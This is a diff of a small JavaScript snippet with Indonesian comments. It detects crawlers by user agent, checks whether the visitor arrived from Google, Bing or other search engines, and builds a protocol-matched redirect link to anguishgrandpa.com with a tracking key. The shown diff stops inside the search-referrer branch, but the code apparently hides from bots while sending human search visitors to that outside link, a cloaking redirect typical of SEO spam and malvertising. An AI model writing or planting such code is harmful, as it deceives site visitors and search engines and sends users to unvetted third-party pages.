@@ -1,5 +1,5 @@
 (function() {
-    // 1. Referrer yang diizinkan
+    // 1. Daftar keyword referrer
     const searchEngines = [
         "google.com", 
         "bing.com", 
@@ -9,15 +9,22 @@
         "duckduckgo.com"
     ];
 
-    // 2. Deteksi Bot
+    // 2. Deteksi Bot dasar
     const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
 
-    // 3. URL referrer
+    // 3. Logika Penyesuaian Protokol (HTTP/HTTPS)
+    // Mengambil protokol halaman saat ini (misal: 'http:' atau 'https:')
+    const currentProtocol = window.location.protocol;
+    
+    // URL dasar tanpa protokol (dimulai dengan //)
+    const rawLink = "//anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3";
+    
+    // Gabungkan protokol dengan link
+    const directLink = currentProtocol + rawLink;
+
     const referrer = document.referrer.toLowerCase();
-    const directLink = "https://anguishgrandpa.com/scg1652n5?key=012f54500c0d91c4f78b75f72cb909d3";
 
     if (!isBot && referrer !== "") {
-        // Periksa apakah referrer berasal dari salah satu search engine di atas
         const isFromSearchEngine = searchEngines.some(engine => referrer.includes(engine));
 
         if (isFromSearchEngine) {
